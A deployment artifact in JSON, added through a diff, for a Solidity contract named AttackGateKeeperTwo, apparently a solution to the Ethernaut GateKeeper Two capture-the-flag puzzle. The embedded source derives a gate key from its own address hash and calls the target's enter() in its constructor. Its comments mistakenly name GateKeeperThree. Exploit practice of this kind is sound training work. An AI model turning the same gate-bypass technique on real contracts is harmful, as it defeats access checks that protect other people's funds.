@@ -1,0 +1,107 @@
+{
+  "address": "0x81f5EDC6E471A461A81413fAEd7151959985a8Af",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "_target",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "nonpayable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "gateKeeper",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ],
+  "transactionHash": "0x9a49c9225966d78b68aca23a7b5a9a38e98602edce9feef31555f60dceaaef7e",
+  "receipt": {
+    "to": null,
+    "from": "0x482577148a64CF20f4a62F14A2455dC0A79478c7",
+    "contractAddress": "0x81f5EDC6E471A461A81413fAEd7151959985a8Af",
+    "transactionIndex": 1,
+    "gasUsed": "141009",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000020000000000000002000000000000000000000000008000000000000000000000000000000000000000000000000000000000800000000000000000000100000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000400000000000000000000000000200000000000000000000000000000000000000000000000000000000100004000000000000000000001000000000000000000000000000000100000000000000000000000000080000000000000000000000000002000000000000000100000",
+    "blockHash": "0xeed9dfbcb0074a7662a78c18c21da47f1260c1e26584333aacdecc846bbc586a",
+    "transactionHash": "0x9a49c9225966d78b68aca23a7b5a9a38e98602edce9feef31555f60dceaaef7e",
+    "logs": [
+      {
+        "transactionIndex": 1,
+        "blockNumber": 41278763,
+        "transactionHash": "0x9a49c9225966d78b68aca23a7b5a9a38e98602edce9feef31555f60dceaaef7e",
+        "address": "0x0000000000000000000000000000000000001010",
+        "topics": [
+          "0x4dfe1bbbcf077ddc3e01291eea2d5c70c2b422b415d95645b9adcfd678cb1d63",
+          "0x0000000000000000000000000000000000000000000000000000000000001010",
+          "0x000000000000000000000000482577148a64cf20f4a62f14a2455dc0a79478c7",
+          "0x0000000000000000000000005082f249cdb2f2c1ee035e4f423c46ea2dab3ab1"
+        ],
+        "data": "0x0000000000000000000000000000000000000000000000000000c05ed3085f000000000000000000000000000000000000000000000000000cae3ad88c4443850000000000000000000000000000000000000000000002d6a7cb1cef9496dd660000000000000000000000000000000000000000000000000cad7a79b93be4850000000000000000000000000000000000000000000002d6a7cbdd4e679f3c66",
+        "logIndex": 1,
+        "blockHash": "0xeed9dfbcb0074a7662a78c18c21da47f1260c1e26584333aacdecc846bbc586a"
+      }
+    ],
+    "blockNumber": 41278763,
+    "cumulativeGasUsed": "170337",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0xC88Ae7Ca2273F6bc5174F6375812f30E3f488E44"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "042da576d6ae88f5bd4807fcb46f8eee",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"gateKeeper\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"author\":\"IbCaOs\",\"kind\":\"dev\",\"methods\":{\"constructor\":{\"details\":\"Constructor to initiate an attack attempt when this contract is deployed\",\"params\":{\"_target\":\"The address of the GateKeeper contract to be attacked\"}}},\"title\":\"AttackGateKeeperTwo\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/GateKeeperTwo/AttackGateKeeperTwo.sol\":\"AttackGateKeeperTwo\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/GateKeeperTwo/AttackGateKeeperTwo.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\n/// @title AttackGateKeeperTwo\\n/// @author IbCaOs\\ncontract AttackGateKeeperTwo {\\n    // Public variable to store the address of the GateKeeper contract\\n    address public gateKeeper;\\n\\n    /// @dev Constructor to initiate an attack attempt when this contract is deployed\\n    /// @param _target The address of the GateKeeper contract to be attacked\\n    constructor(address _target) {\\n        // Set the GateKeeper address\\n        gateKeeper = _target;\\n\\n        // In the GateKeeperThree contract, there's a require statement which checks\\n        // if the XOR operation of the hashed sender address and _gateKey equals type(uint64).max.\\n        // By using maxUint64 (which is type(uint64).max) and the hashed address of this contract,\\n        // we are essentially calculating the \\\"inverse\\\" for the XOR operation.\\n        // This helps us generate a valid _gateKey that satisfies the require statement in GateKeeperThree.\\n\\n        // Define the maximum value for a uint64 type.\\n        uint64 maxUint64 = 0xFFFFFFFFFFFFFFFF;\\n\\n        // Hash the contract's address and convert it into a uint64 type.\\n        uint64 sender = uint64(\\n            bytes8(keccak256(abi.encodePacked(address(this))))\\n        );\\n\\n        // Compute the XOR between maxUint64 and sender to generate the 'gateKey'.\\n        bytes8 gateKey = bytes8(maxUint64 ^ sender);\\n\\n        // Call the 'enter' function of the GateKeeper contract with the generated 'gateKey'\\n        (bool success, ) = _target.call(\\n            abi.encodeWithSignature(\\\"enter(bytes8)\\\", gateKey)\\n        );\\n\\n        // Ensure the transaction was successful, if not, revert with an error message\\n        require(success, \\\"ERROR: TX FAILED\\\");\\n    }\\n}\\n\",\"keccak256\":\"0x01b787518fd8704f9bf1b18151ec4a69ab3eccf41eef602aaea08d8f3d6d9e22\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b5060405161028638038061028683398101604081905261002f91610188565b600080546001600160a01b0319166001600160a01b0383161781556040516001600160601b03193060601b1660208201526001600160401b0391906034016040516020818303038152906040528051906020012060c01c9050600081831860c01b90506000846001600160a01b0316826040516024016100bf91906001600160c01b031991909116815260200190565b60408051601f198184030181529181526020820180516001600160e01b03166319b8102760e11b179052516100f491906101b8565b6000604051808303816000865af19150503d8060008114610131576040519150601f19603f3d011682016040523d82523d6000602084013e610136565b606091505b505090508061017e5760405162461bcd60e51b815260206004820152601060248201526f11549493d48e8815160811905253115160821b604482015260640160405180910390fd5b50505050506101e7565b60006020828403121561019a57600080fd5b81516001600160a01b03811681146101b157600080fd5b9392505050565b6000825160005b818110156101d957602081860181015185830152016101bf565b506000920191825250919050565b6091806101f56000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c806345d61ded14602d575b600080fd5b600054603f906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f3fea26469706673582212200c4188430c9e699cc470e6b7df97175bb641ee47db5fd8f496cb5a9efa21088a64736f6c63430008120033",
+  "deployedBytecode": "0x6080604052348015600f57600080fd5b506004361060285760003560e01c806345d61ded14602d575b600080fd5b600054603f906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f3fea26469706673582212200c4188430c9e699cc470e6b7df97175bb641ee47db5fd8f496cb5a9efa21088a64736f6c63430008120033",
+  "devdoc": {
+    "author": "IbCaOs",
+    "kind": "dev",
+    "methods": {
+      "constructor": {
+        "details": "Constructor to initiate an attack attempt when this contract is deployed",
+        "params": {
+          "_target": "The address of the GateKeeper contract to be attacked"
+        }
+      }
+    },
+    "title": "AttackGateKeeperTwo",
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 4,
+        "contract": "contracts/GateKeeperTwo/AttackGateKeeperTwo.sol:AttackGateKeeperTwo",
+        "label": "gateKeeper",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_address"
+      }
+    ],
+    "types": {
+      "t_address": {
+        "encoding": "inplace",
+        "label": "address",
+        "numberOfBytes": "20"
+      }
+    }
+  }
+}
